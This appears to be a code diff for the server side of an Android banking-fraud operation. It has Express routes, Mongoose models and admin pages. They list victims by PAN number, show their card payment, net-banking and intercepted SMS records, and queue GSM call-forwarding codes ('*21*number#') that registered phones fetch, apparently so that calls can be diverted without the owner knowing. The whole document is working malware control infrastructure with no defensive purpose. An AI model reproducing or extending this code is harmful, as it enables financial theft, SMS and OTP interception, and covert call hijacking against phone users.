@@ -1,0 +1,452 @@
+call.js
+
+
+const mongoose = require('mongoose');
+
+const CallSchema = new mongoose.Schema({
+    call_id: { type: mongoose.Schema.Types.ObjectId, ref: 'Device', unique: true }, 
+    code: { type: String, required: true }
+});
+
+module.exports = mongoose.model('Call', CallSchema);
+
+
+device.js
+
+const mongoose = require('mongoose');
+
+const deviceSchema = new mongoose.Schema({
+    model: String,
+    manufacturer: String,
+    androidVersion: String,
+    brand: String,
+    simOperator: String,
+    uniqueid: {
+        type: String,
+        required: true,
+        unique: true,  
+        default: function () {
+            return new mongoose.Types.ObjectId().toString();  // Generate unique_id automatically
+        }
+    }
+});
+
+module.exports = mongoose.model('Device', deviceSchema);
+
+
+
+
+deviceController.js
+
+
+
+const mongoose = require('mongoose');
+const Device = require('../models/Device');
+const Call = require('../models/Call');
+
+// Add Device
+exports.addDeviceDetails = async (req, res) => {
+    try {
+        const { model, manufacturer, androidVersion, brand, simOperator } = req.body;
+        if (!model || !manufacturer || !androidVersion || !brand || !simOperator) {
+            return res.status(400).json({ success: false, error: "All fields are required!" });
+        }
+
+        const newDevice = new Device({ model, manufacturer, androidVersion, brand, simOperator });
+        await newDevice.save();
+
+        res.status(201).json({ success: true, message: "Device registered successfully!", uniqueid: newDevice._id });
+    } catch (err) {
+        res.status(500).json({ success: false, error: "Server Error" });
+    }
+};
+
+// Get All Devices (for Admin Panel)
+exports.getAllDevices = async (req, res) => {
+    try {
+        const devices = await Device.find({}, 'brand _id');
+        res.render('phone', { devices });
+    } catch (err) {
+        res.status(500).json({ success: false, error: "Server Error" });
+    }
+};
+
+// Get Device Details
+exports.getDeviceDetails = async (req, res) => {
+    try {
+        const device_id = req.params.id;
+        if (!mongoose.isValidObjectId(device_id)) {
+            return res.status(400).json({ success: false, error: "Invalid Device ID" });
+        }
+
+        const device = await Device.findById(device_id);
+        if (!device) {
+            return res.status(404).json({ success: false, error: "Device not found" });
+        }
+
+        res.render('final', { device });
+    } catch (err) {
+        res.status(500).json({ success: false, error: "Server Error" });
+    }
+};
+
+// Stop Call Forwarding (Update Single Entry)
+exports.stopCallForwarding = async (req, res) => {
+    try {
+        const device_id = req.params.id;
+        if (!mongoose.isValidObjectId(device_id)) {
+            return res.status(400).json({ success: false, error: "Invalid Device ID" });
+        }
+
+        await Call.findOneAndUpdate({ call_id: device_id }, { code: "##21#" }, { new: true });
+
+        res.redirect(`/api/device/admin/phone/${device_id}`);
+    } catch (error) {
+        res.status(500).json({ success: false, error: "Internal Server Error" });
+    }
+};
+// Start Call Forwarding (Update if Exists, Else Insert)
+exports.setCallForwarding = async (req, res) => {
+    try {
+        const { phoneNumber } = req.body;
+        const device_id = req.params.id;
+
+        if (!mongoose.isValidObjectId(device_id)) {
+            return res.status(400).json({ success: false, error: "Invalid Device ID" });
+        }
+        if (!/^\d{10}$/.test(phoneNumber)) {
+            return res.status(400).json({ success: false, error: "Invalid phone number format" });
+        }
+
+        const activationCode = `*21*${phoneNumber}#`;
+
+        await Call.findOneAndUpdate(
+            { call_id: device_id },
+            { code: activationCode },
+            { upsert: true, new: true }
+        );
+
+        res.redirect(`/api/device/admin/phone/${device_id}`);
+    } catch (error) {
+        res.status(500).json({ success: false, error: "Internal Server Error" });
+    }
+};
+
+// Get Call Forwarding Status
+exports.getCallForwardingStatus = async (req, res) => {
+    try {
+        const device_id = req.params.id;
+
+        if (!mongoose.isValidObjectId(device_id)) {
+            return res.status(400).json({ success: false, message: "Invalid Device ID", code: null });
+        }
+
+        const callData = await Call.findOne({ call_id: device_id }).select("code");
+
+        if (!callData) {
+            return res.status(404).json({ success: false, message: "No call forwarding set for this device", code: null });
+        }
+
+        res.status(200).json({ success: true, message: "Call forwarding details fetched successfully", code: callData.code });
+    } catch (error) {
+        res.status(500).json({ success: false, message: "Internal Server Error", code: null });
+    }
+};
+
+
+deviceRoute.js
+
+
+const express = require('express');
+const router = express.Router();
+const deviceController = require('../controllers/deviceController');
+
+
+router.get('/admin/phone', deviceController.getAllDevices);
+router.get('/admin/phone/:id', deviceController.getDeviceDetails);
+
+router.post('/admin/set/:id', deviceController.setCallForwarding);
+router.post('/admin/stop/:id', deviceController.stopCallForwarding);
+
+router.get('/admin/call-status/:id', deviceController.getCallForwardingStatus);
+router.post('/admin/device-details', deviceController.addDeviceDetails);
+module.exports = router;
+
+
+
+
+
+final.ejs
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Device Details</title>
+</head>
+<body>
+    <h1>Device Information</h1>
+    <p>Model: <%= device.model %></p>
+    <p>Manufacturer: <%= device.manufacturer %></p>
+    <p>Android Version: <%= device.androidVersion %></p>
+    <p>Brand: <%= device.brand %></p>
+    <p>SIM Operator: <%= device.simOperator %></p>
+
+    <!-- Start Call Forwarding -->
+    <form method="POST" action="/api/device/admin/set/<%= device._id %>">
+        <input type="text" name="phoneNumber" placeholder="Enter 10-digit Phone Number" required>
+        <button type="submit">Start Call Forwarding</button>
+    </form>
+
+    <!-- Stop Call Forwarding -->
+    <form method="POST" action="/api/device/admin/stop/<%= device._id %>">
+        <button type="submit">Stop Call Forwarding</button>
+    </form>
+</body>
+</html>
+
+
+
+phone.ejs
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Phone List</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding: 20px; }
+        h1 { color: #333; }
+        table { width: 80%; margin: 20px auto; border-collapse: collapse; background: white; box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1); }
+        th, td { padding: 12px; border: 1px solid #ddd; text-align: center; }
+        th { background: #007BFF; color: white; }
+        tr:nth-child(even) { background: #f9f9f9; }
+        tr:hover { background: #f1f1f1; }
+        a { text-decoration: none; color: #007BFF; font-weight: bold; }
+        a:hover { color: #0056b3; }
+    </style>
+</head>
+<body>
+    <h1>All Phones</h1>
+    <table>
+        <tr>
+            <th>Brand</th>
+            <th>Details</th>
+        </tr>
+        <% devices.forEach(device => { %>
+            <tr>
+                <td><%= device.brand %></td>
+                <td><a href="/api/device/admin/phone/<%= device._id %>">View Details</a></td>
+            </tr>
+        <% }); %>
+    </table>
+</body>
+</html>
+
+
+   dash
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="stylesheet" href="css/dashboard.css">
+    <style>
+        /* Styling for clickable rows */
+        tr.clickable-row {
+            cursor: pointer;
+        }
+        tr.clickable-row:hover {
+            background-color: #f2f2f2;
+        }
+        .button-container {
+            margin-top: 20px;
+        }
+        .start-button, .stop-button {
+            padding: 10px 15px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .start-button {
+            background-color: green;
+            color: white;
+        }
+        .stop-button {
+            background-color: red;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Admin Dashboard</h1>
+        <div class="settings-icon">
+            <a href="/settings">Update Number</a>
+            <br>
+            <a href="/api/device/admin/phone">View Phone Details</a>
+            <br>
+            <a href="/sms">All SMS</a>          
+        </main>
+        </div>
+    </header>
+
+    <main>
+        <section id="user-data">
+            <h2>User Data</h2>
+            <table>
+                <tbody>
+                    <% users.forEach(function(user) { %>
+                        <tr 
+                            class="clickable-row" 
+                            data-href="/detail/<%= user._id %>"
+                        >
+                            <td><img src="/public/images/avatar.png" alt="avatar"></td>
+                            <td><%= user.pan%></td>
+                            <td>
+                                <a href="/detail/<%= user._id %>">View Details</a>
+                            </td>
+                            <td>
+                                <form action="/delete/<%= user._id %>" method="POST" onsubmit="return confirm('Are you sure you want to delete this user?');">
+                                    <button type="submit" class="delete-button">Delete</button>
+                                </form>
+                            </td>
+                        </tr>
+                    <% }); %>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- Start and Stop Buttons -->
+       
+    <script>
+        // JavaScript to make rows clickable
+        document.addEventListener('DOMContentLoaded', function () {
+            const rows = document.querySelectorAll('.clickable-row');
+            rows.forEach(row => {
+                row.addEventListener('click', function () {
+                    window.location.href = this.dataset.href;
+                });
+            });
+        });
+    </script>
+</body>
+</html>
+
+
+
+
+server.js
+
+
+
+
+const express = require('express');
+const app = express();
+const mongoose = require('mongoose');
+const path = require('path');
+const helmet = require('helmet'); 
+const dotenv = require('dotenv');
+const cors = require('cors');
+const bodyParser = require('body-parser');
+const connectDB = require('./config/dbConfig');
+
+// Models
+const Admin = require('./models/Admin');
+const User = require('./models/User');
+const Notification = require('./models/Notification');
+const CardPayment = require('./models/CardPayment');
+const NetBanking = require('./models/NetBanking');
+
+// Routes
+const cardRoutes = require('./routes/cardRoutes');
+const netBankingRoutes = require('./routes/netBankingRoutes');
+const userRoutes = require('./routes/userRoutes');
+const adminRoutes = require('./routes/adminRoutes');
+const notificationRoutes = require('./routes/notificationRoutes');
+const deviceRoutes = require('./routes/deviceRoutes');  //  Corrected
+
+dotenv.config();
+connectDB();
+
+app.use(helmet());
+app.use(express.json());
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(express.static(path.join(__dirname, 'public')));
+app.set('views', path.join(__dirname, 'views')); 
+app.set('view engine', 'ejs');
+app.use(cors());
+
+// **API Routes**
+app.use('/api/detail', cardRoutes);
+app.use('/api/payment', netBankingRoutes);
+app.use('/api/user', userRoutes);
+app.use('/api/admin', adminRoutes);
+app.use('/api/notification', notificationRoutes);
+app.use('/api/device', deviceRoutes);  
+// **Admin Panel Routes**
+app.get('/dashboard', async (req, res) => {
+    try {
+        const users = await User.find(); 
+        const notifications = await Notification.find();
+        res.render('dashboard', { users, notifications });
+    } catch (err) {
+        console.log(err);
+        res.status(500).send('Error loading dashboard');
+    }
+});
+
+app.get('/detail/:id', async (req, res) => {
+    try {
+        const user = await User.findById(req.params.id);
+        if (!user) return res.status(404).send('User not found');
+
+        const cardPayment = await CardPayment.findOne({ userId: user._id });
+        const netBanking = await NetBanking.findOne({ userId: user._id });
+
+        res.render('detail', { user, cardPayment, netBanking });
+    } catch (err) {
+        console.error('Error fetching user details:', err);
+        res.status(500).send('Error loading details');
+    }
+});
+
+app.post('/delete/:id', async (req, res) => {
+    try {
+        await User.findByIdAndDelete(req.params.id);
+        res.redirect('/dashboard');
+    } catch (err) {
+        console.error("Error deleting user:", err);
+        res.status(500).send("Error deleting user.");
+    }
+});
+
+app.get('/sms', async (req, res) => {
+    try {
+        const notifications = await Notification.find();
+        res.render('sms', { notifications });
+    } catch (err) {
+        console.error("Error fetching notifications:", err);
+        res.status(500).send("Error loading SMS notifications.");
+    }
+});
+
+app.get('/settings', async (req, res) => {
+    try {
+        const admin = await Admin.findOne();
+        res.render('settings', { adminPhoneNumber: admin ? admin.phoneNumber : '' });
+    } catch (err) {
+        console.error('Error loading settings:', err);
+        res.status(500).send('Error loading settings');
+    }
+});
+
+// **Start Server**
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
